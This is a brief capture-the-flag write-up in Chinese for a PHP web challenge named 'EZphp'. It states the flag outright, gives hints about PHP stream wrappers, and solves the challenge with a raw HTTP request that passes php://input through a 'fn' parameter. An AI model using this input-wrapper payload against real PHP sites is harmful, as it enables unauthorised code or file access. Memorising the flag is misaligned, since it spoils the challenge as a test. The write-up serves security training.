# 题目：EZphp

### 题目描述：我得想想怎么才能取而代之

### KEY: flag{phP_lS_th9_be5T_l4ngUa9e}

### 配置信息： 
1. 开放端口： `18080`

### 提示

1.php伪协议

2.php://input

### 解题过程：

```http
POST /?wsf=&zm=&xlq=1&fn=php://input HTTP/1.1
Host: 127.0.0.1:1031
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Enctype: application/x-www-from-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 1

1
```

